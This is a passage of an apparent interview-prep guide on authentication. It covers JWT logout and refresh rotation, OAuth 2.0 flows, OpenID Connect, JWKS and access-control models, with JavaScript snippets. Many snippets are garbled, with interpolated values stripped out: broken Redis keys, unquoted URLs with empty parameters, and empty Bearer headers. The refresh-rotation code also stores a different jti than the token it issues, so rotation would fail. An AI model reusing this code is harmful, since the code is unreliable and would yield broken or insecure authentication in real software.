    const decoded = jwt.decode(accessToken);
    const ttl = decoded.exp - Math.floor(Date.now() / 1000);
    if (ttl > 0) {
      await redis.set(lacklist:, 'true', 'EX', ttl);
    }
  }
  
  res.json({ message: 'Logged out' });
});
`

## Key Points:
- JWTs are stateless -- server doesn't track active tokens
- Revoke refresh token to prevent new access tokens
- Optionally blacklist current access token in Redis
- Blacklist TTL matches token expiration
- Alternative: short expiration makes revocation less critical

## Interview Tip:
Explain why JWT logout is harder than session logout -- it's a common interview question.

---

## Question: How do you rotate refresh tokens?

## Answer:
Refresh token rotation means issuing a new refresh token each time one is used, invalidating the old token. This limits the window if a token is compromised -- if a stolen refresh token is used, the legitimate user's next refresh attempt will fail.

`javascript
// Refresh token rotation
app.post('/api/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
  
  const tokenRecord = await db.findRefreshToken(decoded.jti);
  if (!tokenRecord || tokenRecord.used) {
    await db.revokeTokenFamily(decoded.jti);
    return res.status(401).json({ error: 'Token reuse detected' });
  }
  
  await db.markRefreshTokenUsed(decoded.jti);
  
  const newAccessToken = jwt.sign(
    { sub: decoded.sub },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );
  const newRefreshToken = jwt.sign(
    { sub: decoded.sub, jti: uuid(), type: 'refresh' },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: '7d' }
  );
  
  await db.storeRefreshToken({ jti: uuid(), userId: decoded.sub, used: false });
  res.json({ accessToken: newAccessToken, refreshToken: newRefreshToken });
});
`

## Key Points:
- Issue new refresh token on each use
- Invalidate old token immediately
- Implement reuse detection -- revoke entire family on suspicious use
- Track token families for security monitoring
- Prevents long-term exploitation of stolen refresh tokens

## Interview Tip:
Explain reuse detection -- it's an advanced security feature interviewers value.

---

## Question: What authentication architecture best practices do you follow?

## Answer:
I follow several architecture best practices. I use the access/refresh token pattern with short-lived access tokens (15 minutes) and longer-lived refresh tokens (7 days). I implement refresh token rotation with reuse detection. I store refresh tokens securely (httpOnly cookies for web, secure storage for mobile).

I separate authentication concerns: an auth service handles login/token operations, a verification middleware validates tokens on protected routes, and a refresh endpoint handles token renewal. I use asymmetric keys (RS256) so services can verify tokens without accessing the signing key.

`javascript
// Middleware example
async function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });
  const decoded = await verifyAccessToken(token);
  req.user = decoded;
  next();
}

// Use on protected routes
app.use('/api', authenticate);
app.use('/api/admin', authenticate, requireRole('admin'));
`

Additional practices: implement rate limiting on auth endpoints, monitor for anomalies, use secure session management alongside tokens, and maintain comprehensive audit logs.

## Key Points:
- Access/refresh token pattern with appropriate lifetimes
- Token rotation with reuse detection
- Separation of concerns (auth service, middleware, refresh)
- Asymmetric keys (RS256) for distributed verification
- Rate limiting on auth endpoints
- Comprehensive audit logging

## Interview Tip:
Draw the architecture on paper -- it demonstrates system design thinking.


---

# OAuth & OpenID Connect (51-60)

## Question: What is OAuth 2.0?

## Answer:
OAuth 2.0 is an authorization framework that allows third-party applications to obtain limited access to a user's resources without exposing credentials. It's an open standard (RFC 6749) that defines four roles: Resource Owner, Client, Authorization Server, and Resource Server.

OAuth 2.0 doesn't define a single protocol -- it provides several grant types (flows) for different scenarios: Authorization Code (web apps), Client Credentials (machine-to-machine), and others.

`javascript
// OAuth 2.0 flow (Authorization Code)
// 1. Client redirects user to Authorization Server
const authUrl = https://auth.example.com/authorize?client_id=&redirect_uri=&response_type=code&scope=read write;

// 2. User authenticates and grants permission
// 3. Authorization Server redirects back with code
// 4. Client exchanges code for tokens
const tokenResponse = await fetch('https://auth.example.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: authorizationCode,
    redirect_uri: redirectUri,
    client_id: clientId,
    client_secret: clientSecret
  })
});
`

## Key Points:
- Authorization framework, not authentication protocol
- Four roles: Resource Owner, Client, Authorization Server, Resource Server
- Multiple grant types for different scenarios
- Doesn't store credentials -- uses tokens instead
- Foundation for OpenID Connect
- Open standard (RFC 6749)

## Interview Tip:
Clarify that OAuth is for authorization, not authentication -- OIDC adds authentication.

---

## Question: Why was OAuth created?

## Answer:
OAuth was created to solve the problem of sharing credentials between applications. Before OAuth, users had to give their username and password to third-party applications to access their data. This was insecure -- the third party had full access to the account.

OAuth introduced delegated authorization -- users grant limited access to specific resources without sharing credentials. The third party gets a token with specific scopes, not the user's password.

`javascript
// Before OAuth: Insecure credential sharing
// User gives Google password to third-party app

// After OAuth: Delegated authorization
// User authorizes specific scopes (e.g., read email only)
// Third-party gets access token with limited scope
`

## Key Points:
- Eliminates need to share passwords with third parties
- Provides delegated, limited access via tokens
- Users can revoke access independently
- Tokens have specific scopes (limited permissions)
- Created because credential sharing is insecure

## Interview Tip:
Explain the before OAuth problem -- it makes the value proposition clear.

---

## Question: What problem does OAuth solve?

## Answer:
OAuth solves the delegation problem -- allowing users to grant third-party applications limited access to their resources without sharing credentials. It addresses credential exposure, limited access via scopes, revocability, and standardization.

`javascript
// Problem 1: Credential exposure
// Without OAuth: User gives Gmail password to CRM
// With OAuth: CRM gets read-only access token

// Problem 2: Limited access
// OAuth token: { scope: 'email.read calendar.read' }

// Problem 3: Revocability
// User revokes CRM access via Google dashboard
`

## Key Points:
- Prevents credential exposure to third parties
- Provides fine-grained access control via scopes
- Enables easy access revocation
- Standardizes cross-application authorization
- Eliminates custom credential-sharing integrations

## Interview Tip:
List the specific problems OAuth solves -- shows understanding of its purpose.

---

## Question: How is OAuth different from authentication?

## Answer:
OAuth is an authorization framework -- it grants limited access to resources, not identity verification. Authentication confirms who are you? while authorization determines what can you access?

For authentication, I use OpenID Connect (OIDC), which builds identity verification on top of OAuth 2.0. OIDC provides ID tokens with user identity information.

`javascript
// OAuth: Authorization (what you can access)
const token = await getOAuthToken({ scope: 'read:email write:calendar' });

// OIDC: Authentication (who you are)
const idToken = jwt.decode(oidcToken);
// { sub: 'user123', email: 'user@example.com', name: 'John' }
`

## Key Points:
- OAuth = authorization (resource access)
- OIDC = authentication (identity verification) built on OAuth
- OAuth tokens grant access, not identity claims
- Never use OAuth tokens as authentication -- use OIDC instead
- They solve different problems and should not be confused

## Interview Tip:
Emphasize OAuth does not equal authentication -- this is a critical distinction.

---

## Question: What are OAuth roles?

## Answer:
OAuth defines four roles: Resource Owner (the user), Client (the application requesting access), Authorization Server (authenticates the user and issues tokens), and Resource Server (hosts the protected resources).

`javascript
// OAuth roles in a Login with Google flow:
// Resource Owner: User with a Google account
// Client: Your application requesting Google data
// Authorization Server: Google's OAuth server
// Resource Server: Google's API (Gmail, Calendar, etc.)
`

## Key Points:
- Resource Owner: user who owns the data
- Client: application requesting access
- Authorization Server: authenticates user, issues tokens
- Resource Server: hosts protected resources
- Understanding roles is essential for flow design

## Interview Tip:
Map the roles to a concrete example like Login with Google.

---

## Question: What is a Resource Owner?

## Answer:
The Resource Owner is the entity (typically a user) who owns the protected resources and can grant access to them. In the OAuth flow, the Resource Owner is the person who authenticates with the Authorization Server and decides whether to grant the Client application access to their data.

When I implement OAuth, the Resource Owner is the user who clicks Authorize on the consent screen. They're granting the Client application limited access to specific resources.

## Key Points:
- Entity who owns the protected resources
- Typically a user
- Authenticates with the Authorization Server
- Grants or denies access to the Client
- Consent is required for token issuance

## Interview Tip:
Emphasize that the Resource Owner's consent is the foundation of OAuth.

---

## Question: What is a Client in OAuth?

## Answer:
The Client is the application requesting access to the Resource Owner's protected resources. It could be a web app, mobile app, SPA, or server-side application. I implement different Client types: Confidential Clients (server-side apps that can securely store secrets) and Public Clients (SPAs, mobile apps that can't securely store secrets).

`javascript
// Confidential Client (server-side)
const tokenResponse = await fetch('https://auth.example.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: authCode,
    client_id: clientId,
    client_secret: clientSecret,  // Secret stored server-side
    redirect_uri: redirectUri
  })
});

// Public Client (SPA) -- use PKCE instead of secret
const tokenResponse = await fetch('https://auth.example.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: authCode,
    client_id: clientId,
    code_verifier: codeVerifier  // PKCE verifier
  })
});
`

## Key Points:
- Application requesting access to protected resources
- Confidential Clients (server-side) can store secrets
- Public Clients (SPAs, mobile) cannot store secrets
- Client type determines available OAuth flows
- Must be registered with the Authorization Server

## Interview Tip:
Know the difference between confidential and public clients.

---

## Question: What is an Authorization Server?

## Answer:
The Authorization Server authenticates the Resource Owner and issues tokens to the Client. It handles user login, consent, token generation, token validation, and token revocation. Examples include Google, Auth0, Okta, and Keycloak.

`javascript
// Authorization Server endpoints:
// /authorize - Authorization endpoint (user login + consent)
// /token - Token endpoint (code exchange, refresh)
// /revoke - Token revocation
// /.well-known/openid-configuration - Discovery
`

## Key Points:
- Authenticates the Resource Owner
- Issues authorization codes and tokens
- Validates tokens for Resource Servers
- Handles token refresh and revocation
- Enforces security policies and scopes
- Examples: Google, Auth0, Okta, Keycloak

## Interview Tip:
Name specific Authorization Servers you've used -- it demonstrates practical experience.

---

## Question: What is a Resource Server?

## Answer:
The Resource Server hosts the protected resources that the Client wants to access. It validates tokens and serves resources if the token is valid and has the required scopes.

`javascript
// Resource Server implementation
function requireScope(scope) {
  return (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];
    const decoded = jwt.verify(token, publicKey);
    if (!decoded.scope || !decoded.scope.includes(scope)) {
      return res.status(403).json({ error: 'Insufficient scope' });
    }
    req.user = decoded;
    next();
  };
}

app.get('/api/emails', authenticateToken, requireScope('read:email'), (req, res) => {
  res.json({ emails: getEmails(req.user.sub) });
});
`

## Key Points:
- Hosts protected resources
- Validates access tokens
- Checks required scopes
- Trusts the Authorization Server's token issuance
- Implements scope-based access control

## Interview Tip:
Explain how the Resource Server validates tokens without contacting the Authorization Server.

---

## Question: What are OAuth scopes?

## Answer:
OAuth scopes define the specific permissions a Client is requesting and the Resource Owner is granting. Scopes provide fine-grained access control.

`javascript
// Requesting scopes
const authUrl = https://auth.example.com/authorize?client_id=&scope=read:email write:calendar&response_type=code;

// Token contains granted scopes
{
  sub: 'user123',
  scope: 'read:email write:calendar',
  exp: 1700003600
}

// Resource Server checks scopes
app.get('/api/emails', requireScope('read:email'), (req, res) => {
  // Only reaches here if token has read:email scope
});
`

## Key Points:
- Define specific permissions for OAuth tokens
- Enable fine-grained access control
- Presented to user on consent screen
- Token contains granted scopes
- Follow principle of least privilege

## Interview Tip:
Give concrete scope examples and explain how they map to API operations.


---

# OAuth Flows (61-70)

## Question: What is Authorization Code Flow?

## Answer:
Authorization Code Flow is the most secure OAuth flow for web applications. The Client redirects the user to the Authorization Server, the user authenticates and grants consent, the Authorization Server returns an authorization code, and the Client exchanges the code for tokens server-side.

`javascript
// Authorization Code Flow
const authUrl = https://auth.example.com/authorize?client_id=&redirect_uri=&response_type=code&scope=read;

// Exchange code for tokens (server-side)
const tokenResponse = await fetch('https://auth.example.com/token', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: 'abc123',
    redirect_uri: redirectUri,
    client_id: clientId,
    client_secret: clientSecret
  })
});
`

## Key Points:
- Most secure flow for web applications
- Authorization code is exchanged server-side
- Tokens never exposed to the browser
- Code is one-time-use and short-lived
- Requires client_secret for confidential clients

## Interview Tip:
Explain why the code exchange is more secure than directly returning tokens.

---

## Question: What is Authorization Code Flow with PKCE?

## Answer:
PKCE (Proof Key for Code Exchange) extends the Authorization Code Flow for public clients (SPAs, mobile apps) that can't securely store a client_secret. It adds a code_verifier/code_challenge pair that prevents authorization code interception.

`javascript
// PKCE implementation
const crypto = require('crypto');

// 1. Generate code_verifier
const codeVerifier = crypto.randomBytes(32).toString('base64url');

// 2. Create code_challenge (SHA-256 hash)
const codeChallenge = crypto.createHash('sha256')
  .update(codeVerifier)
  .digest('base64url');

// 3. Authorization request includes code_challenge
const authUrl = https://auth.example.com/authorize?client_id=&code_challenge=&code_challenge_method=S256&response_type=code;

// 4. Token exchange includes code_verifier
const tokenResponse = await fetch('https://auth.example.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: authCode,
    code_verifier: codeVerifier,
    client_id: clientId
  })
});
`

## Key Points:
- Extends Authorization Code Flow for public clients
- Prevents authorization code interception
- Uses code_verifier/code_challenge pair
- Challenge is SHA-256 hash of verifier
- Now recommended for ALL clients, not just public

## Interview Tip:
Know the PKCE steps: generate verifier -> create challenge -> send challenge -> verify with verifier.

---

## Question: What is Client Credentials Flow?

## Answer:
Client Credentials Flow is for machine-to-machine authentication where there's no user involved. The Client authenticates directly with the Authorization Server using its own credentials and receives an access token.

`javascript
// Client Credentials Flow
const tokenResponse = await fetch('https://auth.example.com/token', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({
    grant_type: 'client_credentials',
    client_id: process.env.CLIENT_ID,
    client_secret: process.env.CLIENT_SECRET,
    scope: 'read:data write:data'
  })
});

const { access_token } = await tokenResponse.json();
`

## Key Points:
- No user involved -- service-to-service authentication
- Uses client_id and client_secret directly
- Token represents the client, not a user
- Used for microservices, background jobs, server-to-server
- No authorization code or redirect needed

## Interview Tip:
Give concrete examples: microservice calling another microservice, background worker accessing API.

---

## Question: What is Implicit Flow?

## Answer:
The Implicit Flow returns tokens directly in the URL fragment without an authorization code exchange. It was designed for SPAs but is now deprecated because tokens are exposed in the URL, browser history, and referrer headers.

`javascript
// Implicit Flow (DEPRECATED)
// Tokens returned directly in URL fragment
// https://app.example.com/callback#access_token=abc123&token_type=Bearer

// Problems:
// 1. Tokens exposed in URL (browser history, logs)
// 2. No refresh token support
// 3. Vulnerable to token interception
// 4. No code exchange to validate client

// Replacement: Authorization Code Flow with PKCE
`

## Key Points:
- DEPRECATED -- do not use in new applications
- Returns tokens directly in URL fragment
- Vulnerable to token exposure (URL, logs, referrer)
- No refresh token support
- Replace with Authorization Code Flow + PKCE

## Interview Tip:
Know why Implicit Flow is deprecated -- token exposure in URL is the primary reason.

---

## Question: Why is Implicit Flow no longer recommended?

## Answer:
Implicit Flow is deprecated because tokens are exposed in the URL fragment, making them vulnerable to multiple attack vectors: browser history, HTTP referrer headers, server logs, and client-side JavaScript.

The OWASP OAuth Security guidelines and OAuth 2.0 Security Best Current Practice (RFC 9700) explicitly recommend against Implicit Flow.

`javascript
// Implicit Flow vulnerabilities:
// 1. URL exposure: #access_token=abc123 visible in browser URL
// 2. Referrer leakage: Token sent in Referrer header
// 3. Browser history: Token persists in history
// 4. No refresh tokens: Users must re-authenticate frequently
// 5. No client validation: Cannot verify the client

// Authorization Code Flow + PKCE solves all these issues
`

## Key Points:
- Tokens exposed in URL fragment (multiple attack vectors)
- No code exchange for client validation
- No refresh token support
- OWASP and RFC 9700 explicitly recommend against it
- Replace with Authorization Code Flow + PKCE

## Interview Tip:
Cite OWASP or RFC 9700 to show you follow security standards.

---

## Question: What is Device Authorization Flow?

## Answer:
Device Authorization Flow (RFC 8628) is for devices with limited input capabilities (smart TVs, IoT devices, CLI tools). The device displays a code and URL, the user enters the code on a separate device, authenticates, and grants access.

`javascript
// Device Authorization Flow
// 1. Device requests device code
const deviceResponse = await fetch('https://auth.example.com/device/code', {
  method: 'POST',
  body: new URLSearchParams({ client_id: clientId, scope: 'read' })
});

// 2. Display to user
console.log(Go to  and enter code: );

// 3. Device polls for authorization
while (true) {
  const tokenResponse = await fetch('https://auth.example.com/token', {
    method: 'POST',
    body: new URLSearchParams({
      grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
      device_code: deviceCode,
      client_id: clientId
    })
  });
  if (tokenResponse.ok) break;
  await sleep(5000);
}
`

## Key Points:
- For devices with limited input (smart TVs, IoT, CLI)
- User authorizes on separate device
- Device polls for authorization response
- Uses device_code and user_code

## Interview Tip:
Give examples: smart TV apps, gaming consoles, IoT devices, CLI tools.

---

## Question: When should you use each OAuth flow?

## Answer:
I choose the OAuth flow based on the client type and security requirements.

| Client Type | Recommended Flow |
|-------------|-----------------|
| Web App (server-side) | Authorization Code |
| SPA | Authorization Code + PKCE |
| Mobile App | Authorization Code + PKCE |
| CLI Tool | Device Authorization |
| Smart TV | Device Authorization |
| Microservice | Client Credentials |
| Background Job | Client Credentials |

`javascript
// Decision framework:
// 1. Is there a user? -> Authorization Code (+ PKCE for public clients)
// 2. Is it machine-to-machine? -> Client Credentials
// 3. Is the device input-limited? -> Device Authorization
// 4. Never use Implicit Flow
`

## Key Points:
- Authorization Code: most web apps (default choice)
- Authorization Code + PKCE: SPAs and mobile apps
- Client Credentials: machine-to-machine
- Device Authorization: input-limited devices
- Never use Implicit Flow

## Interview Tip:
Have the table memorized -- it shows clear decision-making ability.

---

## Question: How does Google Login work internally?

## Answer:
Google Login implements OpenID Connect on top of OAuth 2.0. The flow is: your app redirects to Google's authorization endpoint -> user authenticates with Google -> Google returns an authorization code -> your app exchanges the code for tokens -> your app receives an ID token (identity) and access token (API access).

`javascript
// Google Login implementation
const googleAuthUrl = https://accounts.google.com/o/oauth2/v2/auth?client_id=&redirect_uri=&response_type=code&scope=openid email profile&prompt=consent;

// Token exchange
const tokenResponse = await fetch('https://oauth2.googleapis.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    code: authorizationCode,
    client_id: clientId,
    client_secret: clientSecret,
    redirect_uri: redirectUri,
    grant_type: 'authorization_code'
  })
});

const { id_token, access_token } = await tokenResponse.json();

// Verify ID token
const ticket = await client.verifyIdToken({ id_token, audience: clientId });
const payload = ticket.getPayload();
// { sub: 'google_user_id', email: 'user@gmail.com', name: 'John' }
`

## Key Points:
- OpenID Connect on top of OAuth 2.0
- Returns ID token (identity) and access token (API access)
- ID token is JWT signed by Google
- Exchange authorization code for tokens server-side

## Interview Tip:
Explain the ID token vs. access token distinction in Google Login.

---

## Question: How does GitHub OAuth authentication work?

## Answer:
GitHub OAuth follows the standard Authorization Code Flow. Your app registers as an OAuth App on GitHub, receives a client_id and client_secret, and redirects users to GitHub's authorization endpoint.

`javascript
// GitHub OAuth implementation
const githubAuthUrl = https://github.com/login/oauth/authorize?client_id=&scope=read:user user:email;

// Token exchange
const tokenResponse = await fetch('https://github.com/login/oauth/access_token', {
  method: 'POST',
  headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
  body: JSON.stringify({
    client_id: clientId,
    client_secret: clientSecret,
    code: authorizationCode
  })
});

const { access_token } = await tokenResponse.json();

// Fetch user profile
const userResponse = await fetch('https://api.github.com/user', {
  headers: { 'Authorization': Bearer  }
});
const user = await userResponse.json();
`

## Key Points:
- Standard Authorization Code Flow
- Register as OAuth App on GitHub
- Exchange code for access token
- Access token used for GitHub API

## Interview Tip:
Know GitHub's specific scopes and how they map to API access.

---

## Question: What OAuth security best practices do you follow?

## Answer:
I follow OAuth 2.0 Security Best Current Practice (RFC 9700) and OWASP guidelines.

`javascript
// 1. Always validate state parameter
const state = crypto.randomBytes(32).toString('hex');
session.set('oauth_state', state);

// In callback:
if (req.query.state !== session.get('oauth_state')) {
  return res.status(403).json({ error: 'Invalid state' });
}

// 2. Exact redirect_uri matching
const allowedRedirectUris = ['https://app.example.com/callback'];
if (!allowedRedirectUris.includes(req.query.redirect_uri)) {
  return res.status(400).json({ error: 'Invalid redirect_uri' });
}

// 3. PKCE for all clients
const codeVerifier = crypto.randomBytes(32).toString('base64url');
const codeChallenge = crypto.createHash('sha256').update(codeVerifier).digest('base64url');
`

## Key Points:
- Use Authorization Code Flow with PKCE (all clients)
- Never use Implicit Flow
- Validate state parameter for CSRF protection
- Exact redirect_uri matching (no wildcards)
- Short-lived tokens with proper revocation
- Follow RFC 9700 and OWASP guidelines

## Interview Tip:
Cite RFC 9700 -- it shows you follow current security standards.


---

# OpenID Connect (OIDC) (71-80)

## Question: What is OpenID Connect?

## Answer:
OpenID Connect (OIDC) is an identity layer built on top of OAuth 2.0 that provides authentication (identity verification) in addition to authorization. While OAuth 2.0 only grants access to resources, OIDC adds ID tokens that contain verified user identity information.

I use OIDC for Login with Google/GitHub features, single sign-on (SSO), and any scenario where I need verified user identity.

`javascript
// OIDC flow
const authUrl = https://auth.example.com/authorize?client_id=&response_type=code&scope=openid email profile&redirect_uri=;

// Token exchange returns ID token + access token
const tokens = await exchangeCode(code);

// ID token contains identity
const idToken = jwt.decode(tokens.id_token);
// { sub: 'user123', email: 'user@example.com', name: 'John', iss: 'auth.example.com' }
`

## Key Points:
- Authentication layer built on OAuth 2.0
- Provides ID tokens for identity verification
- Standardizes user authentication
- Used for SSO and social login
- Eliminates custom authentication implementations

## Interview Tip:
Clarify that OIDC = OAuth 2.0 + identity layer.

---

## Question: How is OIDC different from OAuth 2.0?

## Answer:
OAuth 2.0 is an authorization framework -- it grants limited access to resources but doesn't verify identity. OIDC is an authentication protocol built on OAuth 2.0 that adds identity verification via ID tokens.

`javascript
// OAuth 2.0: Only authorization
// Token: { access_token: '...', token_type: 'Bearer' }

// OIDC: Authorization + Authentication
// Token: { access_token: '...', id_token: '...' }
// ID token: { sub: 'user123', email: 'user@example.com', name: 'John' }
`

## Key Points:
- OAuth 2.0 = authorization (resource access)
- OIDC = authorization + authentication (identity verification)
- OIDC adds ID tokens containing user identity
- OIDC is a superset of OAuth 2.0
- Use OIDC when you need to verify user identity

## Interview Tip:
The ID token is the key differentiator -- emphasize its role in identity verification.

---

## Question: What is an ID token?

## Answer:
An ID token is a JWT issued by the OpenID Provider that contains verified user identity information. It's the core addition OIDC makes to OAuth 2.0.

`javascript
// ID token example (decoded)
{
  iss: 'https://accounts.google.com',
  sub: 'google_user_id_123',
  aud: 'my_client_id',
  exp: 1700003600,
  iat: 1700000000,
  email: 'user@gmail.com',
  name: 'John Doe',
  email_verified: true
}

// Verifying ID token
const ticket = await client.verifyIdToken({
  id_token: idToken,
  audience: clientId
});
`

## Key Points:
- JWT containing verified user identity
- Signed by the OpenID Provider
- Verified by the application (signature, claims)
- Contains standard claims: sub, email, name
- Never use as access token -- it's for identity only

## Interview Tip:
Know the difference between ID token and access token.

---

## Question: What information does an ID token contain?

## Answer:
An ID token contains standard OIDC claims and optional user profile claims.

`javascript
{
  // Standard OIDC claims
  iss: 'https://accounts.google.com',
  sub: 'user_id_123',
  aud: 'my_client_id',
  exp: 1700003600,
  iat: 1700000000,
  nonce: 'random_value_to_prevent_replay',
  auth_time: 1700000000,
  
  // User profile claims
  name: 'John Doe',
  email: 'john@example.com',
  email_verified: true,
  picture: 'https://example.com/photo.jpg'
}
`

## Key Points:
- Standard claims: iss, sub, aud, exp, iat, nonce, auth_time
- User claims: name, email, picture, locale
- Request only needed claims (minimal disclosure)
- Claims are signed and tamper-proof

## Interview Tip:
Know which claims are standard vs. user profile claims.

---

## Question: What is a userinfo endpoint?

## Answer:
The userinfo endpoint returns user profile information after authenticating with an access token. It's used for additional data beyond the ID token.

`javascript
const userResponse = await fetch('https://auth.example.com/userinfo', {
  headers: { 'Authorization': Bearer  }
});
const user = await userResponse.json();
// { sub: 'user123', name: 'John Doe', email: 'john@example.com' }
`

## Key Points:
- OAuth-protected endpoint returning user profile data
- Requires valid access token
- Returns claims based on granted scopes
- Optional -- ID token often sufficient

## Interview Tip:
Know when to use ID token vs. userinfo endpoint.

---

## Question: What is a discovery endpoint?

## Answer:
The OpenID Connect discovery endpoint (.well-known/openid-configuration) returns the provider's metadata in JSON format.

`javascript
const discovery = await fetch('https://auth.example.com/.well-known/openid-configuration');
const config = await discovery.json();
// config contains: issuer, authorization_endpoint, token_endpoint, jwks_uri, etc.
`

## Key Points:
- Returns provider metadata (endpoints, supported features)
- Located at .well-known/openid-configuration
- Enables dynamic client configuration
- Standard OIDC discovery mechanism

## Interview Tip:
Know the discovery URL format.

---

## Question: What is JWKS?

## Answer:
JWKS (JSON Web Key Set) is a set of public keys used to verify JWT signatures. The OpenID Provider publishes its signing keys at the JWKS endpoint.

`javascript
const jwksClient = require('jwks-rsa');

const client = jwksClient({
  jwksUri: 'https://auth.example.com/.well-known/jwks.json',
  cache: true,
  rateLimit: true
});

function getKey(header, callback) {
  client.getSigningKey(header.kid, (err, key) => {
    const signingKey = key.getPublicKey();
    callback(null, signingKey);
  });
}

jwt.verify(token, getKey, { algorithms: ['RS256'] }, (err, decoded) => {
  if (err) return res.status(401).json({ error: 'Invalid token' });
  req.user = decoded;
});
`

## Key Points:
- Set of public keys for JWT signature verification
- Published at .well-known/jwks.json
- Enables stateless token verification
- Supports key rotation without client changes
- Cache keys with appropriate TTL

## Interview Tip:
Know how to fetch and use JWKS keys.

---

## Question: How are OAuth tokens verified?

## Answer:
OAuth tokens are verified by checking their signature and validating claims. For JWT tokens, the verifier uses the provider's public key (from JWKS). For opaque tokens, the verifier calls the token introspection endpoint.

`javascript
// JWT token verification
const decoded = jwt.verify(token, publicKey, {
  algorithms: ['RS256'],
  issuer: 'https://auth.example.com',
  audience: 'my_client_id'
});

// Token introspection (for opaque tokens)
const introspection = await fetch('https://auth.example.com/introspect', {
  method: 'POST',
  body: new URLSearchParams({ token: opaqueToken, client_id: clientId, client_secret: clientSecret })
});
const { active } = await introspection.json();
`

## Key Points:
- JWT: verify signature with public key (JWKS)
- Opaque: call token introspection endpoint
- Validate: signature, exp, iss, aud claims
- Check revocation status

## Interview Tip:
Know the difference between JWT verification (stateless) and introspection (stateful).

---

## Question: What is token introspection?

## Answer:
Token introspection returns metadata about an access or refresh token. It's used for opaque tokens or when you need real-time token status.

`javascript
const response = await fetch('https://auth.example.com/introspect', {
  method: 'POST',
  body: new URLSearchParams({
    token: tokenToInspect,
    client_id: clientId,
    client_secret: clientSecret
  })
});
const result = await response.json();
// { active: true, sub: 'user123', scope: 'read write', exp: 1700003600 }
`

## Key Points:
- Returns real-time token metadata
- Used for opaque tokens or revocation checks
- Adds latency (network call)
- Cache results briefly for performance

## Interview Tip:
Know when to use introspection vs. local JWT verification.

---

## Question: What OIDC best practices do you follow?

## Answer:
I follow OIDC security best practices: validate ID tokens (signature, iss, aud, exp), use PKCE for all authorization code flows, store tokens securely (httpOnly cookies), implement proper logout (RP-initiated logout), and request minimal scopes.

`javascript
// 1. Validate ID token completely
const ticket = await client.verifyIdToken({ id_token, audience: clientId, nonce: sessionNonce });

// 2. Use PKCE
const codeVerifier = crypto.randomBytes(32).toString('base64url');
const codeChallenge = crypto.createHash('sha256').update(codeVerifier).digest('base64url');

// 3. Minimal scopes
const scope = 'openid email profile';

// 4. Store tokens securely
res.cookie('session', sessionToken, { httpOnly: true, secure: true, sameSite: 'lax' });
`

## Key Points:
- Validate ID tokens completely (signature, iss, aud, exp, nonce)
- Use PKCE for all authorization code flows
- Store tokens in httpOnly cookies
- Request minimal scopes
- Implement RP-initiated logout
- Cache JWKS with rotation handling

## Interview Tip:
Have a mental checklist of OIDC validation steps.


---

# Authorization (81-90)

## Question: What is authorization?

## Answer:
Authorization determines what an authenticated user is allowed to do. After authentication verifies identity, authorization controls access to resources, actions, and data. I implement authorization at multiple levels: route-level, resource-level, and data-level.

`javascript
// Route-level authorization (RBAC)
function authorize(...roles) {
  return (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}

app.delete('/api/users/:id', authorize('admin'), deleteUser);

// Resource-level authorization
app.put('/api/posts/:id', authenticate, async (req, res) => {
  const post = await db.getPost(req.params.id);
  if (post.authorId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Not your post' });
  }
  await db.updatePost(req.params.id, req.body);
  res.json({ success: true });
});
`

## Key Points:
- Determines access after authentication
- Three models: RBAC, ABAC, ACL
- Implement at route, resource, and data levels
- Enforce server-side always
- Follow principle of least privilege

## Interview Tip:
Give concrete examples of authorization at different levels.

---

## Question: What are the different authorization models?

## Answer:
The main authorization models are RBAC (Role-Based Access Control), ABAC (Attribute-Based Access Control), ACL (Access Control Lists), and PBAC (Policy-Based Access Control).

`javascript
// RBAC: Role-based
if (user.role === 'admin') { grantAccess(); }

// ABAC: Attribute-based
if (user.department === resource.department && user.clearance >= resource.classification) {
  grantAccess();
}

// ACL: Access control list
const acl = { 'document:123': { read: ['user1', 'user2'], write: ['user1'] } };
if (acl[resourceId]?.write?.includes(userId)) { grantAccess(); }
`

## Key Points:
- RBAC: roles -> permissions (simple, most common)
- ABAC: attributes -> policies (fine-grained, complex)
- ACL: resource-specific access lists
- PBAC: centralized policy engine
- Choose based on complexity and requirements

## Interview Tip:
Know when to use each model -- it shows architectural decision-making.

---

## Question: What is Role-Based Access Control (RBAC)?

## Answer:
RBAC assigns permissions to roles, and users are assigned to roles. Users inherit all permissions of their assigned roles.

`javascript
const roles = {
  admin: ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write'],
  viewer: ['read'],
  user: ['read_own_data']
};

function requireRole(role) {
  return (req, res, next) => {
    if (!roles[req.user.role]?.includes(role)) {
      return res.status(403).json({ error: 'Insufficient role' });
    }
    next();
  };
}

app.delete('/api/users/:id', requireRole('admin'), deleteUser);
`

## Key Points:
- Permissions assigned to roles, not users
- Users inherit permissions through roles
- Simplifies permission management
- Common pattern: admin, editor, viewer
- Supports hierarchical roles for complex systems

## Interview Tip:
Explain hierarchical roles -- it shows advanced RBAC understanding.

---

## Question: What is Attribute-Based Access Control (ABAC)?

## Answer:
ABAC evaluates access decisions based on attributes of the user, resource, action, and environment. Unlike RBAC's fixed roles, ABAC uses dynamic policies that can consider any combination of attributes.

`javascript
const policies = [
  {
    name: 'department_access',
    effect: 'permit',
    conditions: {
      user: { department: '' },
      resource: { department: '' },
      action: 'read'
    }
  }
];

